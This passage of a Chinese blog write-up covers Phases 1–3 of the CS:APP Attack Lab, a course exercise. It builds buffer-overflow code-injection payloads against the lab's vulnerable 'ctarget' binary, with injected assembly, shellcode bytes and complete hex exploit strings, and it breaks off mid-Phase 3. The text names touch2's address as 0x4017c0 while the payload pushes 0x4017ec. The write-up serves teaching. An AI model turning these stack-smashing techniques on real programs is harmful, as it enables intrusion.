plain">./hex2raw </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> ctarget01.txt </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> ./ctarget -q</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ul><li><code>./hex2raw &lt; ctarget01.txt</code>是利用<code>hex2raw</code>工具将我们的输入看作字节级的十六进制表示进行转化，用来生成攻击字符串</li><li><code>|</code>表示管道，将转化后的输入文件作为<code>ctarget</code>的输入参数</li><li>由于执行程序会默认连接 CMU 的服务器，<code>-q</code>表示取消这一连接</li></ul><p><img loading="lazy" src="/assets/images/image-20220304093523423-16608125586917-3bff4547fcbe410f900d7fed96e0b341.png" width="985" height="547" class="img_ev3q"></p><p><strong>攻击成功！</strong></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="phase-2">Phase 2<a href="#phase-2" class="hash-link" aria-label="Phase 2的直接链接" title="Phase 2的直接链接">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="分析-1">分析<a href="#分析-1" class="hash-link" aria-label="分析的直接链接" title="分析的直接链接">​</a></h3><p>本题结构与上题相同，不同的是调用的<code>touch2</code>函数的内容：</p><div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">touch2</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> val</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    vlevel </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">/* Part of validation protocol */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">val </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> cookie</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> val</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">validate</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> val</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">fail</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">exit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>不仅需要修改返回地址调用<code>touch2</code>函数，还需要把<code>cookie</code>作为参数传进去。题目建议我们不使用<code>jmp</code>和<code>call</code>指令进行代码跳转，也就是说，只能通过在栈中保存目标代码的地址，然后以<code>ret</code>的形式进行跳转。</p><p><strong>我们先深入理解<code>ret</code>指令：</strong></p><p>在CPU中有一个“PC”即程序寄存器，在 x86-64 中用<code>%rip</code>表示，它时刻指向将要执行的下一条指令在内存中的地址。而我们的<code>ret</code>指令就相当于：</p><div class="language-assembly codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-assembly codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">pop %rip</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>即把栈中存放的地址弹出作为下一条指令的地址。</p><p>于是，利用<code>push</code>和<code>ret</code>就能实现我们的指令转移啦！</p><p>思路如下：</p><ul><li><p>首先，通过字符串输入把<code>caller</code>的栈中储存的返回地址改为注入代码的存放地址</p></li><li><p>然后，编写代码。我们的代码应该完成哪些工作呢？</p><ul><li>查看<code>cookie</code>值为<code>0x59b997fa</code>，先将第一个参数寄存器修改为该值</li><li>在栈中压入<code>touch2</code>代码地址</li><li><code>ret</code>指令调用返回地址也就是<code>touch2</code></li></ul></li><li><p>确定注入代码的地址。代码应该存在<code>getbuf</code>分配的栈中，地址为<code>getbuf</code>函数中的栈顶</p></li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="注入代码">注入代码<a href="#注入代码" class="hash-link" aria-label="注入代码的直接链接" title="注入代码的直接链接">​</a></h3><p>查到<code>touch2</code>代码地址为：<code>0x4017c0</code>，由上述思路，得代码如下：</p><div class="language-assembly codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-assembly codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">movq    $0x59b997fa, %rdi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pushq   $0x4017ec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ret</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>利用<code>gdb</code>在<code>getbuf</code>分配栈帧后打断点，查看栈顶指针的位置</p><p><img loading="lazy" src="/assets/images/image-20220304175128141-166081256401410-e50929e409088ff68d8444a5b06247b6.png" width="985" height="547" class="img_ev3q"></p><p><code>0x5561dc78</code>这就是我们应该修改的返回地址</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="栈帧讲解">栈帧讲解<a href="#栈帧讲解" class="hash-link" aria-label="栈帧讲解的直接链接" title="栈帧讲解的直接链接">​</a></h3><p>按照我们的思路，输入字符串后的栈帧应该是这样的</p><p><img loading="lazy" src="/assets/images/image-20220305095954954-166081256744113-7e2e205b58faed75ce4d085b6c863781.png" width="1407" height="678" class="img_ev3q"></p><p>逻辑如下：</p><ul><li><code>getbuf</code>执行<code>ret</code>指令后，注入代码的地址从栈中弹出</li><li>程序执行我们编写的代码，当再次执行<code>ret</code>后，从栈中弹出的就是我们压入的<code>touch2</code>函数的地址，成功跳转</li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="solution-1">Solution<a href="#solution-1" class="hash-link" aria-label="Solution的直接链接" title="Solution的直接链接">​</a></h3><p>先将我们的汇编代码保存到一个<code>.s</code>文件中，接下来利用如下指令</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">gcc -c injectcode.s</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">objdump -d injectcode.o </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> injectcode.d</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>得到字节级表示</p><div class="language-assembly codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-assembly codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Disassembly of section .text:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0000000000000000 &lt;.text&gt;:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   7:   68 ec 17 40 00          pushq  $0x4017ec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   c:   c3                      retq</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>将这段代码放到40个字节中的开头，代码地址放到末尾。于是就得到我们的输入为：</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token number" style="color:#36acaa">48</span><span class="token plain"> c7 c7 fa </span><span class="token number" style="color:#36acaa">97</span><span class="token plain"> b9 </span><span class="token number" style="color:#36acaa">59</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">68</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ec </span><span class="token number" style="color:#36acaa">17</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">40</span><span class="token plain"> 00 c3 00 00 00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 00 00 00 00 00 00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 00 00 00 00 00 00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00 00 00 00 00 00 00 00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">78</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">dc</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">61</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">55</span><span class="token plain"> 00 00 00 00</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><img loading="lazy" src="/assets/images/image-20220304233752252-f8700637c69e59b26638b67e08a8a34e.png" width="962" height="300" class="img_ev3q"></p><p><strong>攻击成功！</strong></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="phase-3">Phase 3<a href="#phase-3" class="hash-link" aria-label="Phase 3的直接链接" title="Phase 3的直接链接">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="分析-2">分析<a href="#分析-2" class="hash-link" aria-label="分析的直接链接" title="分析的直接链接">​</a></h3><p>本题与上题类似，不同点在于传的参数是一个字符串。先给出<code>touch3</code>的C语言代码</p><div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">touch3</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">sval</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    vlevel </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">/* Part of validation protocol */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">hexmatch</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">cookie</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> sval</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> sval</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">validate</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> sval</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">fail</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">exit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>touch3</code>中调用了<code>hexmatch</code>，它的C语言代码为：</p><div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">/* Compare string to hex represention of unsigned value */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">hexmatch</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> val</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">sval</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> cbuf</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">110</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic">/* Make position of check string unpredictable */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">s </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> cbuf </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">random</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">%</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">100</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">sprintf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">s</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;%.8x&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> val</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">strncmp</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">sval</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> s</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">9</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>也就是说，我们要把<code>cookie</code>转换成对应的字符串传进去</p><p>注意第6行，<code>s</code>的位置是随机的，我们写在<code>getbuf</code>栈中的字符串很有可能被覆盖，一旦被覆盖就无法正常比较。</p><p>因此，考虑把<code>cookie</code>的字符串数据存在<code>test</code>的栈上，其它部分与上题相同，这里不再重复思路。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="注入代码-1">注入代码<a href="#注入代码-1" class="hash-link" aria-label="注入代码的直接链接" title="注入代码的直接链接">​</a></h3><p>先查找<code>test</code>栈顶指针的位置：</p><p><img loading="lazy" src="/assets/images/image-20220305094755965-6d5d71adb6435d46b8ba320bc6facbb7.png" width="960" height="458" class="img_ev3q"></p><p><code>0x5561dca8</code>，这就是我们字符串存放的位置，也是调用<code>touch3</code>应该传入的参数，又<code>touch3</code>代码的地址为<code>4018fa</code>。从而得到代码：</p><div class="language-assembly codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-assembly codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">movq    $0x5561dca8, %rdi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pushq   $0x4018fa</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ret</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>字节级表示为：</p><div class="language-assembly codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-assembly codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Disassembly of section .text:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0000000000000000 &lt;.text&gt;:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   7:   68 fa 18 40 00          pushq  $0x4018fa</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   c:   c3                      retq</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="栈帧讲解-1">栈帧讲解<a href="#栈帧讲解-1" class="hash-link" aria-label="栈帧讲解的直接链接" title="栈帧讲解的直接链接">​</a></h3><p>我们期望的栈帧应该是这样的：</p><p><img loading="lazy" src="/assets/images/image-20220305101326911-a1ce335c66668dda7b90d05d53c5fb14.png" width="1300" height="684" class="img_ev3q"></p><p>逻辑如下：</p><ul><li><code>getbuf</code>执行<code>ret</code>，从栈中弹出返回地址，跳转到我们注入的代码</li><li>代码执行，先将存在<code>caller</code>的栈中的字符串传给参数寄存器<code>%rdi</code>，再将<code>touch3</code>的地址压入栈中</li><li>代码执行<code>ret</code>，从栈中弹出<code>touch3</code>指令，成功跳转</li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="solution-2">Solution<a href="#solution-2" class="hash-link" aria-label="Solution的直接链接" title="Solution的直接链接">​</a></h3><p>我们的cookie<code>0x59b997fa</code>作为字符串转换为<code>ASCII</code>为：<code>35 39 62 39 39 37 66 